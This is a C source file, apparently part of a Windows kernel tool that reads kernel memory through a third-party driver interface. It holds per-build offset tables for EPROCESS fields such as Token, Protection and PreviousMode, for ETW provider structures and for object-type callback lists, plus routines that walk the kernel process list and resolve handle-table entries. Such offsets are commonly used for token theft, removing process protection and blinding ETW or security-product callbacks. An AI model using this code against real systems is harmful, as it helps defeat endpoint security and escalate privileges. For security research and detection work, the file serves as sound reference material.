
#pragma once
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <evntprov.h>
#include "3rdDriverInterface.hpp"
#include "CallbackOffsets.h"

#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"Version.lib")
#pragma comment(lib, "ntdll")


typedef struct _OBJECT_OFFSETS {
	DWORD EPROC_UniqueProcessId;
	DWORD EPROC_ActiveProcessLinks;
	DWORD EPROC_ImageFileNameOffset;
	DWORD EPROC_Token;
	DWORD EPROC_ObjectTable;
	DWORD EPROC_Protection;
	DWORD KPROC_ThreadListHead;
	DWORD KTHR_PreviousMode;
	DWORD64 ETW_REG_ENTRY_GuidEntry;
	DWORD64 ETW_GUID_ENTRY_Guid;
	DWORD64 ETW_GUID_ENTRY_ProviderEnableInfo;
	DWORD64 ETW_GUID_ENTRY_SiloState;
	DWORD64 ETW_SILODRIVERSTATE_WmiLoggerContext;
	DWORD64 ETW_SILODRIVERSTATE_EtwHashBucket;
	DWORD OBJTYPE_CallbackList;
	BOOL Ready;
} OBJECT_OFFSETS;



BOOL GetEprocByPid(HANDLE Device, int pid, DWORD64 * obj) {
	
	// get object offsets for the running Windows version
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return FALSE;
		}

	// get System(4) EPROCESS object address
	DWORD64 SystemProcessAddress = NULL;
	if (!GetSystemEproc(&SystemProcessAddress)) {
		printf("[!] Error getting System process EPROCESS object!\n");
		return FALSE;
	}

	// iterate over all processes and find the one belonging to the target pid
	DWORD64 TargetPID = pid;
	DWORD64 ProcessHead = SystemProcessAddress + g_ObjOffsets.EPROC_ActiveProcessLinks;
	DWORD64 TempEProcAddress = ProcessHead - g_ObjOffsets.EPROC_ActiveProcessLinks;
	DWORD64 TempPID = 0;
	BOOL r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_UniqueProcessId, &TempPID);
	if (!r) return r;

	while (TempPID != TargetPID) {		// search until we find the target PID
		DWORD64 TempLink = 0;
		// get the next object
		r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_ActiveProcessLinks, &TempLink);
		if (!r) return r;

		// calculate its EPROCESS address
		TempEProcAddress = TempLink - g_ObjOffsets.EPROC_ActiveProcessLinks;
		if (TempEProcAddress == ProcessHead)	// (shouldn't happen) break the loop if we searched all the processes
			return FALSE;
		// get the current object's PID
		r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_UniqueProcessId, &TempPID);
		if (!r) return r;
	}

	// return the EPROCESS address
	*obj = TempEProcAddress;

	return TRUE;
}


BOOL GetHandleTableEntry(HANDLE Device, DWORD64 HandleTable, DWORD64 HandleID, DWORD64 * HandleEntryAddress) {
	
	// https://doxygen.reactos.org/de/d51/ntoskrnl_2ex_2handle_8c.html#a1fa10d89ce5eb73bd55ed2cd2001d38a

	// get current max handle value
	DWORD HandleMax = 0;
	if (!TDIReadKernel32(Device, HandleTable, &HandleMax))
		return FALSE;
	printf("[+] Current handle max: 0x%x\n", HandleMax);
		
	// clear handle 2 LSBits - handles increment by 4
	DWORD64 hID = HandleID & 0xfffffffffffffffc;
	
	// check if searched handle is valid
	if (hID >= (DWORD64) HandleMax) {
		printf("[!] Handle (0x%x) does not exist.\n", hID);
		return FALSE;
	}
	
	// get TableCode value from HANDLE_TABLE struct
	DWORD64 TableCode = 0;
	if (!TDIReadKernel64(Device, HandleTable + HANDLE_TABLE_CODE_OFFSET, &TableCode))
		return FALSE;
	printf("[+] Target table code: 0x%p\n", TableCode);	
	
	// find the right table entry by looking through Table hierarchy
	DWORD TableLevel = (DWORD) (TableCode & 3);
	DWORD64 t1, t2 = 0;
	switch (TableLevel) {
		case 0: // read the entry directly
			*HandleEntryAddress = TableCode + 4 * hID;
			break;
		case 1: // read through first level handle table
			if (!TDIReadKernel64(Device, TableCode + 8 * (hID >> 10) - 1, &t1))
				return FALSE; 
			//printf("t1 = %llx\n", t1);
			*HandleEntryAddress = t1 + 4 * (hID & 0x3ff);
			break;
		case 2: // read through second and then first level handle table
			if (!TDIReadKernel64(Device, TableCode + 8 * (hID >> 19) - 2, &t2))
				return FALSE;
			//printf("t2 = %llx\n", t2);
			if (!TDIReadKernel64(Device, t2 + 8 * ((hID >> 10) & 0x1ff), &t1))
				return FALSE;
			 //printf("t1 = %llx\n", t1);
			*HandleEntryAddress = t1 + 4 * (hID & 0x3ff);
			break;
		default:
			*HandleEntryAddress = 0;
	}
	
	return TRUE;
}


BOOL GetWinOffsets() {
	// based on Vergilius Project:
	// https://www.vergiliusproject.com/kernels/x64
	//
	// x64 kernels only!
/*	
	// Windows 11 (x64) Version 23H2 BuildNumber 22631
	// Windows 11 (x64) Version 22H2 BuildNumber 22621
	// Windows 11 (x64) Version 21H2 BuildNumber 22000
	// Windows 10 (x64) Version 2210 22H2 BuildNumber 19045
	// Windows 10 (x64) Version 2110 21H2 BuildNumber 19044
	// Windows 10 (x64) Version 2104 21H1 BuildNumber 19043
	// Windows 10 (x64) Version 2009 20H2 BuildNumber 19042
	// Windows 10 (x64) Version 2004 20H1 BuildNumber 19041
	// Windows 10 (x64) Version 1909 19H2 BuildNumber 18363
	// Windows 10 (x64) Version 1903 19H1 BuildNumber 18362
	// Windows 10 (x64) Version 1809 BuildNumber 17763
	// Windows 10 (x64) Version 1803 BuildNumber 17134
	// Windows 10 (x64) Version 1709 BuildNumber 16299
	// Windows 10 (x64) Version 1703 BuildNumber 15063
	// Windows 10 (x64) Version 1607 BuildNumber 14393
	// Windows 10 (x64) Version 1511 BuildNumber 10586
	// Windows 10 (x64) Version 1507 BuildNumber 10240
	// Windows 8.1 (x64) Version BuildNumber 9600
	// Windows 8 (x64) Version BuildNumber 9200
	// Windows 7 (x64) Version BuildNumber 7601
*/
	DWORD BuildNo = GetWinBuildNo();
	if (BuildNo == 0)
		return FALSE;
	
	g_ObjOffsets.KPROC_ThreadListHead = 0x30;
	
	if (BuildNo == 7601) {							// Windows 7 (x64)
		g_ObjOffsets.EPROC_UniqueProcessId = 0x0180;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x0188;
		g_ObjOffsets.EPROC_ImageFileNameOffset = 0x2e0;
		g_ObjOffsets.EPROC_Token = 0x0208;
		g_ObjOffsets.EPROC_ObjectTable = 0x200;
		g_ObjOffsets.EPROC_Protection = 0x00;							// no Process Protection field in _EPROCESS
		g_ObjOffsets.KTHR_PreviousMode = 0x1f6;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x10;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x14;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x50;
		g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x00;					// no SiloState in _ETW_GUID_ENTRY
		g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x00;		// no _ETW_SILODRIVERSTATE
		g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x00;			// no _ETW_SILODRIVERSTATE
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc0;
		g_ObjOffsets.Ready = TRUE;
	}
	if (BuildNo >= 9200 && BuildNo <= 9600) {		// Windows 8 & 8.1 (x64)
		g_ObjOffsets.EPROC_UniqueProcessId = 0x02e0;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x02e8;
		g_ObjOffsets.EPROC_ImageFileNameOffset = 0x438;
		g_ObjOffsets.EPROC_Token = 0x0348;	
		g_ObjOffsets.EPROC_ObjectTable = 0x408;
		if (BuildNo == 9600) g_ObjOffsets.EPROC_Protection = 0x67a;		// 8.1
		if (BuildNo == 9200) g_ObjOffsets.EPROC_Protection = 0x0;		// 8 - no Process Protection field in _EPROCESS
		g_ObjOffsets.KTHR_PreviousMode = 0x232;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x10;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x18;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x50;
		g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x00;					// no SiloState in _ETW_GUID_ENTRY
		g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x00;		// no _ETW_SILODRIVERSTATE
		g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x00;			// no _ETW_SILODRIVERSTATE
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc8;
		g_ObjOffsets.Ready = TRUE;
	}
	if (BuildNo >= 10240 && BuildNo <= 14393) {		// Windows 10 versions: 1507, 1511, 1607
		g_ObjOffsets.EPROC_UniqueProcessId = 0x02e8;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x02f0;
		if (BuildNo == 10240) g_ObjOffsets.EPROC_ImageFileNameOffset = 0x448;
		else g_ObjOffsets.EPROC_ImageFileNameOffset = 0x450;
		g_ObjOffsets.EPROC_Token = 0x0358;	
		g_ObjOffsets.EPROC_ObjectTable = 0x418;
		if (BuildNo == 10240) g_ObjOffsets.EPROC_Protection = 0x6aa;		// 1507
		if (BuildNo == 10586) g_ObjOffsets.EPROC_Protection = 0x6b2;		// 1511
		if (BuildNo == 14393) g_ObjOffsets.EPROC_Protection = 0x6c2;		// 1607
		g_ObjOffsets.KTHR_PreviousMode = 0x232;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x20;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x18;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x50;
		if (BuildNo == 14393 ) {										// 1607
			g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x178;
			g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x390;
			g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x590;
		}
		else {															// 1507 & 1511
			g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x00;					// no SiloState in _ETW_GUID_ENTRY
			g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x00;		// no _ETW_SILODRIVERSTATE
			g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x00;			// no _ETW_SILODRIVERSTATE
		}
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc8;
		g_ObjOffsets.Ready = TRUE;
	}
	if (BuildNo >= 15063 && BuildNo <= 17763) {		// Windows 10 versions: 1703, 1709, 1803, 1809
		g_ObjOffsets.EPROC_UniqueProcessId = 0x02e0;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x02e8;
		g_ObjOffsets.EPROC_ImageFileNameOffset = 0x450;
		g_ObjOffsets.EPROC_Token = 0x0358;
		g_ObjOffsets.EPROC_ObjectTable = 0x418;
		g_ObjOffsets.EPROC_Protection = 0x6ca;
		g_ObjOffsets.KTHR_PreviousMode = 0x232;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x20;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x18;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x50;
		if (BuildNo == 15063) {											// 1703
			g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x178;
			g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x398;
			g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x598;
		}
		if (BuildNo == 16299) {											// 1709
			g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x178;
			g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x1a8;
			g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x1b0;
		}
		else {															// 1803 & 1809
			g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x28;						// from pdb, diff from Vergilius!
			g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x60;			// from pdb, diff from Vergilius!
			g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x188;					// from pdb, diff from Vergilius!
			g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x1c8;		// from pdb, diff from Vergilius!
			g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x1d0;		// from pdb, diff from Vergilius!
		}
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc8;
		g_ObjOffsets.Ready = TRUE;
	}
	if (BuildNo >= 18362 && BuildNo <= 18363) {		// Windows 10 versions: 1903, 1909
		g_ObjOffsets.EPROC_UniqueProcessId = 0x02e8;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x02f0;
		g_ObjOffsets.EPROC_ImageFileNameOffset = 0x450;
		g_ObjOffsets.EPROC_Token = 0x0360;
		g_ObjOffsets.EPROC_ObjectTable = 0x418;
		g_ObjOffsets.EPROC_Protection = 0x06fa;
		g_ObjOffsets.KTHR_PreviousMode = 0x232;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x20;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x18;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x50;
		g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x178;
		g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x1b0;
		g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x1b8;
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc8;
		g_ObjOffsets.Ready = TRUE;		
	}
	if (BuildNo >= 19041 && BuildNo <= 22631) {		// Windows 10 version 2004; Windows 11 versions: all?
		g_ObjOffsets.EPROC_UniqueProcessId = 0x0440;
		g_ObjOffsets.EPROC_ActiveProcessLinks = 0x0448;
		g_ObjOffsets.EPROC_ImageFileNameOffset = 0x5a8;
		g_ObjOffsets.EPROC_Token = 0x04b8;
		g_ObjOffsets.EPROC_ObjectTable = 0x570;
		g_ObjOffsets.EPROC_Protection = 0x87a;
		g_ObjOffsets.KTHR_PreviousMode = 0x232;
		g_ObjOffsets.ETW_REG_ENTRY_GuidEntry = 0x20;
		g_ObjOffsets.ETW_GUID_ENTRY_Guid = 0x28;
		g_ObjOffsets.ETW_GUID_ENTRY_ProviderEnableInfo = 0x60;
		g_ObjOffsets.ETW_GUID_ENTRY_SiloState = 0x188;
		g_ObjOffsets.ETW_SILODRIVERSTATE_WmiLoggerContext = 0x1c8;
		g_ObjOffsets.ETW_SILODRIVERSTATE_EtwHashBucket = 0x1d0;
		g_ObjOffsets.OBJTYPE_CallbackList = 0xc8;
		g_ObjOffsets.Ready = TRUE;
	}
	
	return g_ObjOffsets.Ready;
}
